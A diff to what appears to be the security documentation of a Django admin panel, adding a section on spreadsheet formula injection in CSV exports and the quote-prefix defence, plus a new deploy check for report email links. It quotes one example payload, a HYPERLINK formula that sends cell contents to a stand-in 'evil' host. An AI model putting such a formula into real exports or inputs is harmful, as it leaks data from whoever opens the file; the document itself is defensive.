@@ -295,9 +295,22 @@ check) is the first line of defence; it is not a reason to skip the second one:
   `Content-Disposition: attachment`, so a browser downloads a file rather than
   executing it inline whatever its content turns out to be.
 
+## Spreadsheet formulas in exports
+
+A CSV opened in Excel, LibreOffice or Sheets treats a cell that starts with `=`, `+`,
+`-`, `@`, a tab or a carriage return as a formula, and a formula such as
+`=HYPERLINK("http://evil/?"&A1,"x")` can send other cells off to a stranger. Any text a
+user can type is therefore a payload waiting for whoever exports it. The Export button
+(CSV and TSV), scheduled report attachments and the import and job error reports all put
+a `'` in front of such a text cell. Only text is changed; numbers, dates and booleans
+are written as they are, so a negative amount stays a number. NDJSON export is not
+changed. A text value that really begins with one of these characters will show the
+`'` if the file is imported back. Vantage has no Excel export; one would need the same
+rule.
+
 ## The `--deploy` checks
 
-Nine checks, all silent unless the panel is actually mounted (a project that has not
+Ten checks, all silent unless the panel is actually mounted (a project that has not
 wired `site.urls` into any `urls.py` gets no warnings for a panel it is not running),
 all registered with `deploy=True` so they stay out of the everyday `manage.py check` —
 a check that is right on a laptop and wrong in production is a check everyone learns to
@@ -315,6 +328,7 @@ scroll past.
 | `vantage.W057` | No `LoginThrottleMiddleware`, and nothing else in `MIDDLEWARE` looks like a throttle (matched loosely against `axes`, `ratelimit`, `throttle`, `defender`, `brute`, so an equivalent third-party package silences this too) |
 | `vantage.W058` | No `PanelSecurityMiddleware` — no security headers, no autocomplete/export/import budgets |
 | `vantage.W059` | [Media served from the panel's own origin](#media-on-a-separate-origin) while at least one registered model has a `FileField` |
+| `vantage.W115` | `REPORTS` is on and `REPORTS_BASE_URL` is unset, so links in [report emails](reports.md#the-email) are built from the `Host` header of the request that created each subscription |
 
 Run it:
 
